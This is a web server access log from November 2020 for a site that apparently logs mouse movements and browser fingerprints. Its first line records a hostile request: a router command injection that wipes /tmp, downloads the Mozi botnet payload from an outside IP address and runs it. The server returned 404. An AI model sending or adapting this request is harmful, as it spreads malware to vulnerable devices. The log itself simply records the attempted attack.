- - [26/Nov/2020:07:00:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.223.12.183:54430/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [26/Nov/2020:07:30:23 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:31:11 +0000] "-" 408 0 "-" - "-"
- - [26/Nov/2020:07:31:11 +0000] "-" 408 0 "-" - "-"
- - [26/Nov/2020:08:38:51 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
- - [26/Nov/2020:08:42:35 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:36 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 598 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:36 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 835 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:36 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1047 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:36 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 200 398 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:36 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1261 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:49 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:51 +0000] "GET /content/big_data/data_analysis.php HTTP/1.1" 200 4249 "http://160.40.52.164/content/big_data.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:53 +0000] "GET /content/big_data/data_analysis/data_mining.php HTTP/1.1" 200 1897 "http://160.40.52.164/content/big_data/data_analysis.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:42:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:11 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:12 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:13 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:14 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:15 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:16 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:17 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:18 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:19 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:20 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:23 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
